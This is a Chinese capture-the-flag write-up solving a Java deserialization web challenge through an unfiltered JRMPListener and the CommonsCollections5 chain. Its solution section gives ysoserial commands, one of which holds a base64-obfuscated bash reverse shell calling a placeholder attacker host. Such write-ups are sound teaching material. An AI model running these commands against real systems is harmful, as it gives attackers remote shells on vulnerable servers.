# easy_java

> 分类：Web

## 题目描述

Java 反序列化。存在反序列化点和黑名单（未过滤 JRMPListener），pom.xml 有 commons-collections 依赖。

## 考察知识点

- Java 反序列化
- JRMP 利用链（ysoserial）
- CommonsCollections5

## 解法

1. 发现反序列化点，黑名单未对 JRMPListener 过滤。
2. pom.xml 有 commons-collections 依赖，用 ysoserial 生成 exp：

```bash
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 23334 CommonsCollections5 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eHgueHh4Lnh4eC54eHgvMjMzMzMgMD4mMQ==}|{base64,-d}|{bash,-i}"

java -jar ysoserial-0.0.6-SNAPSHOT-all.jar JRMPClient xxx.xxx.xxx.xxx:23334 > 1.poc
```

3. 将 1.poc 提交到反序列化点，反弹 shell 获取 flag。

## 参考答案

（flag 通过 JRMP 反弹 shell 后读取）

## 来源

- 作者：一叶飘零 | https://www.4hou.com/posts/yMvW
